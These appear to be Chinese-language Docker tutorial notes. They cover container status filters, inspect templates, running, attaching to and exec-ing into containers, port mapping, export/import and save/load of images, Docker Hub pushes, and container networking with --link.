使用CTRL+P+Q退出当前容器内部会话然后后台运行
或者
先按ctrl+p,再按ctrl+q
绝对不能使用exit、ctrl+c或ctrl+d来退出,这样整个系统就退出

退出后再进入ubuntu
1、首先用docker ps -a查找到该CONTAINER ID对应编号
2、进入该系统docker attach 0a3309a3b29e(此时没反应,ctrl+c就进入到ubuntu系统中去了)

【 查看容器运行状 态】
~$ docker ps                     # 查看在运行的容器的状态,CONTAINER ID:容器ID,NAMES:自动分配的容器名称
~$ docker ps -l                  # 查询最后一次创建的容器
~$ docker ps -a                  # Show all containers(default shows just running)
~$ docker ps -s                  # Display total file sizes
~$ docker ps -al

~$ docker ps -f since=mysql               # 使用过滤器来列出在mysql之后创建的容器
~$ docker ps -f name=php                  # 使用过滤器来列出php容器
~$ docker ps --filter "label=color"       # 过滤器指定label color不管它什么值来匹配容器
~$ docker ps --filter "label=color=blue"  # 过滤器指定label color及值blue来匹配容器
~$ docker ps -a --filter 'exited=0'       # 过滤成功退出的容器
~$ docker ps -a --filter 'exited=137'     # 过滤出那么以退出码137退出的容器,意味着此容器收到了SIGKILL(9)信号
~$ docker ps --filter status=running      # 过滤状态码running的容器
~$ docker ps --filter ancestor=ubuntu     # 过滤使用latest ubuntu镜像的容器
~$ docker ps --filter ancestor=ubuntu:12.04.5 # 匹配基于ubuntu,版本12.04.5镜像的容器
~$ docker ps --filter ancestor=d0e008c6cf02   #匹配基于数据层d0e008c6cf02或在数据层堆栈中有这个数据层的镜像的容器
~$ docker ps --filter volume=remote-volume --format "table {{.ID}}\t{{.Mounts}}" # 显示挂载有指定数据卷或有一个数据卷挂载到指定路径的容器
~$ docker ps --filter network=net1  # 过滤出匹配连接到网络为net1的容器
~$ docker ps --filter network=8c0b4110ae930dbe26b258de9bc34a03f98056ed6f27f991d32919bfe401d7c5  #
显示连接到net1网络的容器,使用的是网络id来匹配

过滤标志(-f或–filter)格式是key=value。如果超过一个过滤,就传递多个标志(如–filter "foo=bar" –filter "bif=baz")
目前支持的过滤有:
id(容器id)
label(label=或label=>)
name(全匹配或部分匹配容器名称)
exited(整数 – 容器退出码。只在使用–all才有用)
status(created restarting running paused exited dead)
ancestor([:], or ) – 过滤从指定镜像创建的容器。
before(容器的名称或id) – 过滤在给定id或名称之前创建的容器。
since(容器的名称或id) – 过滤在给定id或名称之后创建的容器。
isolation(default process hyperv)(Windows daemon only)
volume(数据卷名称或挂载点) – 过滤挂载有指定数据卷的容器。
network(网络id或名称) – 过滤连接到指定网络的容器

~$ docker ps --no-trunc  # 显示链接容器
CONTAINER ID                                                       IMAGE               COMMAND                                               CREATED             STATUS              PORTS                              NAMES
f8bd80e0c6b22ca12807fe0f298e44a2ef4085d95a8b3a43748622917748cd8d   php:7.2.5-fpm       "docker-php-entrypoint php -S 0.0.0.0:8080 -t /app"   About an hour ago   Up About an hour    0.0.0.0:8080->8080/tcp, 9000/tcp   php
a25729de9ff27043558cf129abe64f09090e9ad4d89f7b68def40a7d70a85505   mysql               "docker-entrypoint.sh mysqld"                         6 hours ago         Up 6 hours          3306/tcp                           mysql,php/mysql

格式化
格式化选项(–format)使用Go模板来美化打印容器输出。
Go模板有效的占位符如下:
.ID 容器ID
.Image 镜像ID
.Command Quoted command
.CreatedAt 创建容器的时间点.
.RunningFor 从容器创建到现在过去的时间.
.Ports 暴露的端口.
.Status 容器状态.
.Size 容器占用硬盘大小.
.Names 容器名称.
.Labels 容器所有的标签.
.Label 指定label的值 例如'{{.Label "com.docker.swarm.cpu"}}'
.Mounts 挂载到这个容器的数据卷名称

$ docker ps --format "{{.ID}}: {{.Command}}"
$ docker ps --format "table {{.ID}}\t{{.Labels}}"
$ docker ps -s --format "{{.Names}}: {{.Size}}"

~$ docker top amazing_cori       # 查看正在运行的容器内部运行的进程,终止的容器会报错

~$ docker container ls           # 查看容器信息
~$ docker container ls -a        # 查看终止状态的容器
~$ docker container ls -a | nl

~$ docker logs 2b1b7a428627      # 查看容器内的标准输出
~$ docker logs amazing_cori
~$ docker logs -f amazing_cori   # -f:持续监视容器的输出,让dockerlogs像使用tail -f一样来输出容器内部的标准输出
~$ docker logs -ft amazing_cori  # -t运行选项指明希望输出每条Log的时间
~$ docker container logs amazing_cori

~$ docker stats amazing_cori     # 动态显示指定单个或多个容器的运行状态
~$ docker stats                  # 动态显示运行的容器运行状态
~$ docker stats -a               # 动态显示所有容器的运行状态
~$ docker stats --all
~$ docker stats --format string  # Pretty-print images using a Go template
~$ docker stats --no-stream      # Disable streaming stats and only pull the first result

docker inspect [OPTIONS] NAME|ID [NAME|ID...]  # 获取容器/镜像的元数据,参数为某一容器进程的id
~$ docker inspect mysql          # 查看mysql镜像的信息
~$ docker inspect amazing_cori   # 查看Docker镜像或容器的底层信息,返回一个JSON文件记录着Docker容器的配置和状态信息
~$ docker inspect ubuntu1 | nl | grep hello
~$ docker inspect -f '{{ .NetworkSettings.IPAddress }}' aed8  # 获取容器的IP地址
~$ docker inspect -f "{{.Name }}" aed8                        # 查看容器的名字

-f的实参是Go模版,并在容器/镜像的元数据上以该Go模版作为输入,返回模版指定的数据
Go模版是一种模板引擎,让数据以指定的模式输出
{{ }} 语法用于处理模版指令,大括号外的任何字符都将直接输出
"." 表示"当前上下文"。大多数情况下表示了容器元数据的整个数据结构,但在某些情况下可以重新规定上下文,比如使用with函数
inspect数据可以由浮点数、字符串和布尔组成,可以使用Go模版内置函数进行比较判断。虽然Go模版支持整数,但目前inspect数据中的数值类型都是浮点数,而整数应该对于大多数场景更方便。使用字符串时可以使用双引号

$ docker inspect -f 'Hello from container {{.Name}}' jenkins
Hello from container /jenkins

$ docker inspect -f "This is a bit pointless" jenkins   # 不指定元数据
This is a bit pointless

# 通过模版来查找所有退出码为非0的容器名,对于每个容器无论是否匹配到都会输出一行
$ docker inspect -f '{{if ne 0.0 .State.ExitCode }}{{.Name}} {{.State.ExitCode}}{{ end }}' $(docker ps -aq)
/tender_colden 1
/clever_mcclintock 126
/grave_bartik 1

# 在jenkins-data容器中查找卷/var/jenkins_home对应在host的目录
$ docker inspect -f '{{index .Volumes "/var/jenkins_home"}}' jenkins-data
/var/lib/docker/vfs/dir/5a6f7b306b96af38723fc4d31def1cc515a0d75c785f3462482f60b730533b1a

# 使用with函数重新规定上下文
$ docker inspect -f '{{.State.Pid}}' jenkins
6331
$ docker inspect -f '{{with .State}} {{.Pid}} {{end}}' jenkins
6331

# 使用$来获取根上下文
$ docker inspect -f '{{with .State}} {{$.Name}} has pid {{.Pid}} {{end}}' jenkins
 /jenkins has pid 6331

# 单独使用 "." 本身也是可以的,将输出未格式化的完整元数据
$ docker inspect -f '{{.}}' jenkins
...

【 Docker Hello World 】
Docker允许在容器内运行应用程序,使用docker run命令来在容器内运行一个应用程序。

# Docker以ubuntu15.10镜像创建一个新容器,然后在容器里执行bin/echo "Hello world",然后输出结果,之后终止容器
~$ docker run ubuntu:15.10 /bin/echo "Hello world"
~$ docker run ubuntu:15.10 /bin/sh -c "echo hello world"   # sh -c指定执行的是字符串命令,而不是脚本文件
~$ docker run --name ubuntu1 ubuntu echo hello world
~$ docker run --name ubuntu1 --rm ubuntu echo "hello world"

--name container_name
创建一个容器时docker会自动命名,也可使用--name来命名容器,命名须在镜像之前
容器的名称是唯一的,如果已经命名了一个叫web的容器,当要再次使用web这个名称的时候需要先用docker rm删除之前创建的同名容器

--rm
执行docker run时如果添加--rm标记则容器退出终止后会立刻删除
默认情况下为了排障需求退出的容器并不会立即删除,除非手动docker rm。如果不需要排障和保留结果可以使用--rm可以避免浪费空间
--rm和-d参数不能同时使用

各个参数解析:
docker run:运行一个容器。
ubuntu:15.10指定要运行的镜像,用ubuntu:15.04镜像为基础来启动容器,Docker首先从本地主机上查找镜像是否存在,如果不存在Docker就会从镜像仓库Docker Hub下载公共镜像。
/bin/echo "Hello world": 在启动的容器里执行的命令的路径和命令参数

【 运行交互式的容器 】
通过docker的两个参数-i -t让docker运行的容器实现"对话"的能力
~$ docker run -i -t ubuntu:15.10 /bin/bash
root@dc0050c79503:/#

$ docker run -it --rm \
    ubuntu:15.04 \
    bash

各个参数解析:
-t 选项让Docker在新容器内分配一个伪终端(pseudo-tty)并绑定到容器的标准输入上
-i 选项让容器的标准输入保持打开,允许对容器内的标准输入(STDIN)进行交互,在交互模式下用户可以通过所创建的终端来输入命令
此时已进入一个ubuntu15.10系统的容器,可以在Shell下操作,执行任何所需的命令,
尝试在容器中运行命令cat /proc/version和ls分别查看当前系统的版本信息和当前目录下的文件列表,
执行cat /etc/os-release是Linux常用的查看当前系统版本的命令
可以通过运行exit命令或使用CTRL+D来退出容器

容器的核心为所执行的应用程序,所需要的资源都是应用程序运行所必需的,除此之外并没有其它的资源,可以在伪终端中利用ps或top来查看进程信息。
$ docker run -t -i ubuntu:14.04 /bin/bash
$ ps
  PID TTY          TIME CMD
    1 ?        00:00:00 bash
   11 ?        00:00:00 ps
可见容器中仅运行了指定的bash应用,这种特点使得Docker对资源的利用率极高,是货真价实的轻量级虚拟化。

【 后台模式运行容器 】
更多的时候,需要让Docker在后台运行而不是直接把执行命令的结果输出在当前宿主机下,此时可以通过添加-d参数来实现
容器是否会长久运行是和docker run指定的命令有关,和-d参数无关
使用-d参数启动后会返回一个唯一的id

使用以下命令创建一个以进程方式运行的容器(后台模式), -c指定执行的是字符串命令,而不是脚本文件
~$ docker run -d ubuntu:15.10 /bin/sh -c "while true; do echo hello world; sleep 3; done"
2b1b7a428627c51ab8810d541d759f072b4fc75487eed05812646b8534a2fe63

在输出中没有看到期望的"hello world",而是一串以2b1b7a428627开头的长字符
这个长字符串叫做容器ID,对每个容器来说都是唯一的,可以通过容器ID来查看对应的容器发生了什么。

【 通过网络端口来访问运行在docker容器内的服务 】
$ docker run -d -P training/webapp python app.py
在docker容器中运行一个Python Flask应用来运行一个web应用
-d:让容器在后台运行
-P:将容器内部使用的网络端口随机映射到主机的高端口
-p:是容器内部端口绑定到指定的主机端口

docker ps查看端口映射信息
0.0.0.0:32769->5000/tcp
Docker开放了5000端口(默认Python Flask端口)映射到主机端口32769上,这时可以通过浏览器访问WEB应用192.168.43.27:32769

~$ docker run -d -p 5000:5000 training/webapp python app.py  # 通过-p参数设置不一样的端口,容器内部的5000端口映射到本地主机的5000端口上
~$ docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py # 指定容器绑定的网络地址,以通过访问127.0.0.1:5001来访问容器的5000端口
~$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py # 默认绑定tcp端口,如果要绑定UDP端口,可以在端口后面加上/udp

网络端口的快捷方式
通过docker ps命令可以查看到容器的端口映射,docker还提供了另一个快捷方式:docker port查看指定(ID或名字)容器的某个确定端口映射到宿主机的端口号。
上面创建的web应用容器ID为:7a38a1ad55c6 名字为:determined_swanson
~$ docker port 7a38a1ad55c6 或 determined_swanson # 查看容器端口的映射情况
~$ docker port determined_swanson 5000  # 快捷地查看端口的绑定情况

【 docker cp命令 】
$ docker cp --help
Usage:  docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-
        docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH

Copy files/folders between a container and the local filesystem

Options:
  -a, --archive       Archive mode(copy all uid/gid information)
  -L, --follow-link   Always follow symbol link in SRC_PATH

docker pull nginx
www: 目录将映射为 nginx 容器配置的虚拟目录。
logs: 目录将映射为 nginx 容器的日志目录。
conf: 目录里的配置文件将映射为 nginx 容器的配置文件。
mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf
# 拷贝容器内Nginx默认配置文件到本地当前目录下的conf目录,容器ID可以查看docker ps命令输入中的第一列：
docker cp nginx:/etc/nginx/nginx.conf ~/nginx/conf

docker run -d -p 80:80 --name nginx-webs -v ~/nginx/www:/usr/share/nginx/html -v ~/nginx/conf/nginx.conf:/etc/nginx/nginx.conf -v ~/nginx/logs:/var/log/nginx -v ~/nginx/conf/conf.d:/etc/nginx/conf.d nginx
-v ~/nginx/www:/usr/share/nginx/html：将我们自己创建的 www 目录挂载到容器的 /usr/share/nginx/html。
-v ~/nginx/conf/nginx.conf:/etc/nginx/nginx.conf：将我们自己创建的 nginx.conf 挂载到容器的 /etc/nginx/nginx.conf。
-v ~/nginx/logs:/var/log/nginx：将我们自己创建的 logs 挂载到容器的 /var/log/nginx。

启动以上命令后进入 ~/nginx/www 目录：
$ cd ~/nginx/www
创建 index.html 文件

然后直接访问服务器ip即可

【 进入容器进行操作 】
运行docker容器的时候使用了-d参数,把容器在后台运行后
对于一个已关闭的容器的登陆,可以使用"docker start -ai container"登陆。这种其实就是先启动容器,然后再进入容器内
# docker stop tomcat
# docker start -i tomcat        //参数用-i或-a -i两个参数都可以
# exit                          //不过这种方式,在退出当前窗口后,也会导致容器停止

1、docker attach
如果从这个stdin中exit会导致容器的停止
但当多个窗口同时使用该命令进入该容器时,所有的窗口都会同步显示。如果有一个窗口阻塞了,那么其他窗口也无法再进行操作。
所以docker attach命令不太适合于生产环境,平时自己开发应用时可以使用该命令

</pre><textarea>$ docker run -dit ubuntu     # 创建一个守护态的Docker容器
243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550

$ docker container ls
CONTAINER ID  IMAGE          COMMAND       CREATED          STATUS          PORTS    NAMES
243c32535da7  ubuntu:latest  "/bin/bash"   18 seconds ago   Up 17 seconds            nostalgic_hypatia

$ docker attach 243c
root@243c32535da7:/#

</textarea><pre>
2、docker exec
如果从这个stdin中exit不会导致容器的停止,推荐使用
docker exec命令后边可以跟多个参数
只用-i参数时,由于没有分配伪终端,界面没有Linux命令提示符,但命令执行结果仍然可以返回。
当-i -t参数一起使用时,则可以看到Linux命令提示符

</pre><textarea>$ docker run -dit ubuntu
69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6

$ docker container ls
CONTAINER ID IMAGE          COMMAND       CREATED       STATUS         PORTS          NAMES
69d137adef7a ubuntu:latest  "/bin/bash"   18 seconds agoUp 17 seconds                 zealous_swirles

$ docker exec -i 69d1 bash
ls
bin
boot
dev
...

$ docker exec -it 69d1 bash
root@69d137adef7a:/#

</textarea><pre>
3、使用SSH进入Docker容器
在生产环境中排除了使用docker attach命令进入容器之后,相信大家第一个想到的就是ssh。在镜像或容器中安装SSH Server,这样就能保证多人进入容器且相互之间不受干扰了,相信大家在当前的生产环境中(没有使用Docker的情况)也是这样做的。
但是使用了Docker容器之后不建议使用ssh进入到Docker容器内

4、使用nsenter进入Docker容器
nsenter可以访问另一个进程的名称空间,所以为了连接到某个容器还需要获取该容器的第一个进程的PID,可使用docker inspect命令拿到该PID:docker inspect -f {{.State.Pid}} 44fc0f0582d9
在拿到该进程PID之后就可以使用nsenter命令访问该容器了
$ sudo nsenter --target 3326 --mount --uts --ipc --net --pid

【 暂停恢复运行容器 】
~$ docker pause amazing_cori     # 用docker ps命令来查看容器运行状态(STATUS)仍然是:Up,但后面括号表明Paused
~$ docker unpause amazing_cori

【 终止重启容器 】
当Docker容器中指定的应用终结时容器也自动终止

~$ docker stop amazing_cori      # 终止一个运行中的容器,停止WEB应用容器

~$ docker start amazing_cori     # 重新启动处于终止状态的容器
~$ docker container start containerName
~$ docker restart amazing_cori   # 将一个运行态的容器终止,然后再重新启动
~$ docker container restart containerName

【 删除容器 】
$ docker rm  trusting_newton
$ docker container rm  trusting_newton     # 使用docker container rm来删除一个处于终止状态的容器,非停止状态会报错
$ docker container rm -f  trusting_newton  # 添加-f参数删除一个运行中的容器,Docker会发送SIGKILL信号给容器
$ docker container prune                   # 批量清理掉所有处于终止状态的容器
$ docker container ls -aq | xargs docker container rm -f  # 强制删除宿主机上所有容器

【 导出和导入容器 制作生成镜像 】
$ docker export --help
Usage:  docker export [OPTIONS] CONTAINER
Export a container's filesystem as a tar archive
Options:
  -o, --output string   Write to a file instead of STDOUT

导出本地某个容器快照到本地文件
$ docker export 7691a814370e > ubuntu.tar

导入容器快照
用户既可以使用docker load来导入镜像存储文件到本地镜像库,也可以使用docker import来导入一个容器快照到本地镜像库
区别在于容器快照文件将丢弃所有的历史记录和元数据信息(即仅保存容器当时的快照状态),而镜像存储文件将保存完整记录,体积也要大
此外从容器快照文件导入时可以重新指定标签等元数据信息。

$ docker import --help
Usage:  docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]
Import the contents from a tarball to create a filesystem image
Options:
  -c, --change list      Apply Dockerfile instruction to the created image
  -m, --message string   Set commit message for imported image

压缩包将会在镜像/目录展开,并直接作为镜像第一层提交

$ cat ubuntu.tar | docker import - test/ubuntu:v1.0           # 可以使用docker import从容器快照文件中再导入为镜像

$ docker import http://example.com/exampleimage.tgz example/imagerepo  # 也可以通过指定URL或者某个目录来导入

命令自动下载ubuntu-14.04-x86_64-minimal.tar.gz文件,并且作为根文件系统展开导入,并保存为镜像openvz/ubuntu:14.04
docker history查看新建镜像的历史会看到描述中有导入的文件链接
$ docker import \
    http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz \
    openvz/ubuntu:14.04

docker save 和 docker load命令
Docker还提供了docker load和docker save命令,用以将镜像保存为一个tar文件,然后传输到另一个位置上,再加载进来。
这是在没有Docker Registry时的做法,现在已经不推荐,镜像迁移应该直接使用Docker Registry,无论是直接使用Docker Hub还是使用内网私有Registry都可以。

docker save命令用于持久化镜像,不是容器
使用docker save命令可以将镜像保存为归档文件

$ docker save --help
Usage:  docker save [OPTIONS] IMAGE [IMAGE...]
Save one or more images to a tar archive(streamed to STDOUT by default)
Options:
  -o, --output string   Write to a file, instead of STDOUT

sudo docker save 镜像名称 > 保存地址文件名
sudo docker save lanmps > /home/save-lanmps.tar

加载docker load
$ docker load --help
Usage:  docker load [OPTIONS]
Load an image from a tar archive or STDIN
Options:
  -i, --input string   Read from tar archive file instead of STDIN
  -q, --quiet          Suppress the load output

docker load < /home/save-lanmps.tar

实例:
$ docker save alpine | gzip > alpine-latest.tar.gz  # 保存为镜像
$ docker load -i alpine-latest.tar.gz               # 将文件复制到另外一台机器上加载镜像

如果结合这两个命令以及ssh甚至pv的话,利用Linux强大的管道,可以写一个命令完成从一个机器将镜像迁移到另一个机器,并且带进度条的功能:
docker save <镜像名> | bzip2 | pv | ssh <用户名>@<主机名> 'cat | docker load'

【 在Docker中配置时区 】
Base Image使用的基本上都是Docker官方的,所以里面的时间设置大多是Etc/UTC即标准的UTC时间,所以要简单的调整一下变成中国标准时间CST(China Standard Time)

如果已经创建了container的话,可以直接接入到container里面,用命令行实现时区的更改:
# docker exec -ti container bash
# echo "Asia/Shanghai" > /etc/timezone
# dpkg-reconfigure -f noninteractive tzdata

可以看到屏幕上有类似的输出:
Current default time zone: 'Asia/Shanghai'
Local time is now:      Thu Feb  5 10:55:04 CST 2015.
Universal Time is now:  Thu Feb  5 02:55:04 UTC 2015.

之所以要用noninteractive的方式,是为了方便整合到Dockerfile中使用,比如:
RUN echo "Asia/Shanghai" > /etc/timezone
RUN dpkg-reconfigure -f noninteractive tzdata

【 查看docker里某个容器的的启动命令 】
1,在容器外部,物理机上,可以用docker inspect查看或docker inspect container

2,如果在容器内部可以用ps -fe查看,其中1号进程就是启动命令。

3,Docker会在隔离的容器中运行进程。当运行docker run命令时,Docker会启动一个进程,并为这个进程分配其独占的文件系统、网络资源和以此进程为根进程的进程组。在容器启动时,镜像可能已经定义了要运行的二进制文件、暴露的网络端口等,但用户可以通过docker run命令重新定义(docker run可以控制一个容器运行时的行为,它可以覆盖docker build在构建镜像时的一些默认配置),这也是为什么run命令相比于其它命令有如此多的参数的原因。

4,命令格式

5,最基本的docker run命令的格式如下:$ sudo docker run [OPTIONS] IMAGE[:TAG] [COMMAND] [ARG...]
OPTIONS总起来说可以分为两类:
设置运行方式:
决定容器的运行方式,前台执行还是后台执行;
设置containerID;
设置网络参数;
设置容器的CPU和内存参数;
设置权限和LXC参数;
设置镜像的默认资源,也就是说用户可以使用该命令来覆盖在镜像构建时的一些默认配置。

7,docker run [OPTIONS]可以让用户完全控制容器的生命周期,并允许用户覆盖执行docker build时所设定的参数,甚至也可以修改本身由Docker所控制的内核级参数。

</pre>

<h4>容器运行实例</h4><pre>
docker run busybox /bin/echo Hello Docker  # 使用下载的busybox镜像来运行容器,容器运行并输出了"Hello Docker"
sudo docker ps -la  # 运行的容器实例也可以通过这条命令看到,从运行列表可以看到这个容器处于Exited状态。

接下来将在容器中运行一个在后台执行的ping进程,这个进程在docker run命令返回后仍然在后台运行,可以通过docker logs命令捕捉ping进程的输出
ping_job=$(sudo docker run -d zhangpeihao/bosybox:base /bin/ping 127.0.0.1) # 命令执行后界面没有任何输入,到底有没有运行成功可以通过上面介绍的docker ps命令查看
echo $ping_job  # 输入命令看ping_job是一个什么值,返回的是一串字符就是运行的容器ID。它的前12位与docker ps命令查看到的容器ID一致。
sudo docker logs -f -t $ping_job   # 可以看到ping程序的执行结果,就像直接运行ping命令一样。可以通过Ctrl+C输入退出docker logs命令,而完全不影响ping进程的执行。
sudo docker logs -f -t 3a2         # 也可以直接输入容器ID的前3位
sudo docker pause $ping_job # 输入docker pause命令来暂停容器的运行
使用docker ps命令来查看容器运行状态时,这个容器的状态(STATUS)仍然是:Up,但是后面括号表明Paused。
使用docker logs命令查看进程输出,可以看到输出停止了,并没有ping命令的停止时的总结统计信息,此时ping进程只是被挂起了,并没有收到退出信号。

sudo docker unpasue $ping_job
使用docker logs命令查看ping命令输出,可以看到ping命令并没有重启,seq数值在docker unpause命令之后继续之前数值,而没有归零。可以看到使用Docker容器可以方便的将一个容器内的进程挂起,然后再继续执行。

sudo docker stop $ping_job
从docker logs命令看到输出停止,但同样没有输出ping命令退出时的统计结果。通过docker ps命令可以看到容器状态已经是:Exited。
为什么没有统计结果呢,这是由于ping命令的统计结果是在收到INT信号时输出的,而docker stop命令发出的是TERM和KILL信号。

使用docker kill命令向ping进程发送INT信号。在此之前需要先把容器重新运行起来,输入命令:
sudo docker start $ping_job
从docker logs命令看到,ping命令重新运行了,seq也归零后重新计数。

现在通过docker kill命令来停止容器,命令如下:
sudo docker kill -s "INT" $ping_job
从docker logs命令看到,ping命令输出了统计结果,如同本地运行ping命令一样。通过-s命令选项还可以向进程发送指定的信号,甚至是用户自定义的信号。

创建Docker Hub账号
Docker Hub(hub.docker.com)是Docker官方提供的Register和Index服务
注册页面,Docker Hub推荐使用GitHub账号进行注册,因为Docker Hub可以绑定GitHub账号,实现自动编译
注册成功后,进入个人首页
在Docker Hub上创建仓库,选择"Repository"
打开设置新仓库属性的页面,设置命名空间和仓库名和简介
目前Docker Hub为每一个账号提供了一个免费的私有仓库
选择"Public",点击"Add Repository"按钮,创建仓库,进入新仓库的首页

在命令行环境创建镜像
登入Docker Hub
命令行docker login -u用户名-p密码-eEmail 命令,也可以不带参数,Docker命令行客户端会提示输入用户名、密码和Email。 输入的登入信息会被发送到Docker Hub的索引服务进行身份认证。如果认证成功认证信息会被保存在本地Home目录的.dockercfg文件里。

提交与上传镜像
现在已经创建了一个容器用来ping某个地址,接下来把工作保存到软件仓库,并提供给测试或运维来使用。

首先将容器保存到镜像中,输入命令:
sudo docker commit $ping_job <用户名>/busybox:ping_job
命令返回一串文本,这是新提交的镜像ID。通过docker images命令可以看到创建了一个新的image。但此时这个image还只存在于本地,而且完全没有进行权限验证,也就是说完全可以在本地创建一个名叫"zhangpeihao/busybox:ping_job"的镜像而不上传。

sudo docker push <用户名>/busybox:ping_job
上传成功后会输出:Image successfully pushed。通过hub.docker.com网页可以看到busybox仓库中增加了ping_job标签。

Docker的上传过程与下载过程是类似的。
前两步,Docker客户端向Docker Hub的索引服务发送镜像查询请求;
第三步,Docker客户端按照Docker Hub的索引服务返回的Registry服务地址,授权信息向Registry发送上传请求;
第四步和第五步,Registry服务向Docker Hub请求验证Docker客户端提供的授权信息,如果验证通过,最后一步Registry允许Docker客户端上传镜像。而上传的过程和现在的过程一样,将镜像分解成多个层进行上传。

使用镜像
其他人如果想要使用这个镜像,输入命令:
sudo docker pull <用户名>/busybox:ping_job
将镜像下载到本地,然后直接运行镜像:
sudo docker run -d <用户名>/busybox:ping_job

</pre>
</div>

<div id="docker_network">
<h3>Docker中的网络功能</h3><pre>
Docker启动时会自动在主机上创建一个docker0虚拟网桥,实际上是Linux的一个bridge,可理解为一个软件交换机,它会在挂载到它的网口之间进行转发
同时Docker随机分配一个本地未占用的私有网段中的一个地址给docker0接口,比如典型的172.17.42.1,掩码为255.255.0.0,此后启动的容器内的网口也会自动分配一个同一网段(172.17.0.0/16)的地址。

当创建一个Docker容器的时候,同时会创建了一对veth pair接口(当数据包发送到一个接口时,另外一个接口也可以收到相同的数据包)
这对接口一端在容器内,即eth0;另一端在本地并被挂载到docker0网桥,名称以veth开头(如vethAQI2QT)
通过这种方式主机可以跟容器通信,容器之间也可以相互通信
Docker就创建了在主机和所有容器之间一个虚拟共享网络。

Docker允许通过外部访问容器或容器互联的方式来提供网络服务

容器有自己的内部网络和ip地址,使用docker inspect可以获取所有的变量,Docker还可以有一个可变的网络配置

Docker容器连接
端口映射并不是唯一把docker连接到另一个容器的方法。
docker有一个连接系统允许将多个容器连接在一起,共享连接信息。
docker连接会创建一个父子关系,其中父容器可以看到子容器的信息

</pre>

<h4>外部访问容器</h4><pre>
容器中可以运行一些网络应用,要让外部也可以访问这些应用,可以通过 -P 或 -p 参数来指定端口映射。

【 查看映射端口配置 】
使用docker port来查看当前映射的端口配置,也可以查看到绑定的地址
$ docker port nginx_P
80/tcp -> 0.0.0.0:32768
$ docker port nginx_P 80
0.0.0.0:32768
$ docker port nostalgic_morse 5000
127.0.0.1:49155.

【 当使用-P标记时,Docker会随机映射一个49000~49900的端口到内部容器开放的网络端口 】
$ docker run -d -P training/webapp python app.py

$ docker container ls -l  # 本地主机的49155被映射到容器5000端口,访问本机的49155端口即可访问容器内web应用提供的界面
CONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES
bc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155->5000/tcp  nostalgic_morse

$ docker logs -f nostalgic_morse     # 可以通过docker logs命令来查看应用的信息
* Running on http://0.0.0.0:5000/
10.0.2.2 - - [23/May/2014 20:16:31] "GET / HTTP/1.1" 200 -
10.0.2.2 - - [23/May/2014 20:16:31] "GET /favicon.ico HTTP/1.1" 404 -

【 -p指定要映射的端口,并且在一个指定端口上只可以绑定一个容器 】

1、映射所有接口地址
使用hostPort:containerPort格式本地的5000端口映射到容器的5000端口,可执行
$ docker run -d -p 5000:5000 training/webapp python app.py  # 默认会绑定本地所有接口上的所有地址

2、映射到指定地址的指定端口
可以使用ip:hostPort:containerPort格式指定映射使用一个特定地址,比如localhost地址127.0.0.1
$ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py

3、映射到指定地址的任意端口
使用ip::containerPort绑定localhost的任意端口到容器的5000端口,本地主机会自动分配一个端口。
$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py

4、-p标记可以多次使用来绑定多个端口
$ docker run -d \
    -p 5000:5000 \
    -p 3000:80 \
    training/webapp \
    python app.py

5、还可以使用udp标记来指定udp端口
$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py

</pre>

<h4>容器互联 --link</h4><pre>
容器的连接linking系统是除了端口映射外另一种跟容器中应用交互的方式,该系统会在源和接收容器之间创建一个隧道,接收容器可以看到源容器指定的信息。
Docker在两个互联的容器之间创建了一个安全隧道,而且不用映射它们的端口到宿主主机上。在启动db容器的时候并没有使用-p和-P标记,从而避免了暴露数据库端口到外部网络上。

使用--link参数可以让容器之间安全的进行交互,--link参数的格式为--link name:alias,其中name是要链接的容器的名称,alias是这个连接的别名。
$ sudo docker run -d --name db training/postgres   # 创建一个新的数据库容器
$ sudo docker run -d -P --name web --link db:db training/webapp python app.py  # 创建web容器并连接到db容器,db容器和web容器建立互联关系

使用docker ps来查看容器的连接,db容器的names列有db也有web/db。这表示web容器链接到db容器,web容器将被允许访问db容器的信息。
$ docker ps
CONTAINER ID  COMMAND               CREATED             STATUS             PORTS                    NAMES
349169744e49  su postgres -c '/usr  About a minute ago  Up About a minute  5432/tcp                 db, web/db
aed84ee21bde  python app.py         16 hours ago Up     2 minutes          0.0.0.0:49154->5000/tcp  web

docker inspect php在HostConfig.Links字段可查看php容器连接的其他容器
$ docker inspect --format '{{.HostConfig.Links}}' php
[/mysql:/php/mysql]

Docker通过2种方式为容器公开连接信息:
docker exec -it container_name bash进入容器执行env命令和cat /etc/hosts命令

1、环境变量
更新 /etc/hosts 文件
使用env命令来查看web容器的环境变量

$ sudo docker run --rm --name web2 --link db:db training/webapp env
DB_NAME=/web2/db
DB_PORT=tcp://172.17.0.5:5432
DB_PORT_5000_TCP=tcp://172.17.0.5:5432
DB_PORT_5000_TCP_PROTO=tcp
DB_PORT_5000_TCP_PORT=5432
DB_PORT_5000_TCP_ADDR=172.17.0.5
其中DB_开头的环境变量是供web容器连接db容器使用,前缀采用大写的连接别名。

2、除了环境变量,Docker还添加host信息到父容器的/etc/hosts的文件。下面是父容器web的hosts文件
$ sudo docker run -t -i --rm --link db:db training/webapp /bin/bash
root@aed84ee21bde:/opt/webapp# cat /etc/hosts
172.17.0.7  aed84ee21bde
172.17.0.5  db

这里有2个hosts,第一个是web容器,web容器用id作为他的主机名,第二个是db容器的ip和主机名。

可以在web容器中安装ping命令来测试跟db容器的连通。
root@aed84ee21bde:/opt/webapp# apt install -yqq inetutils-ping
root@aed84ee21bde:/opt/webapp# ping db
PING db(172.17.0.5): 48 data bytes
56 bytes from 172.17.0.5: icmp_seq=0 ttl=64 time=0.267 ms
56 bytes from 172.17.0.5: icmp_seq=1 ttl=64 time=0.250 ms
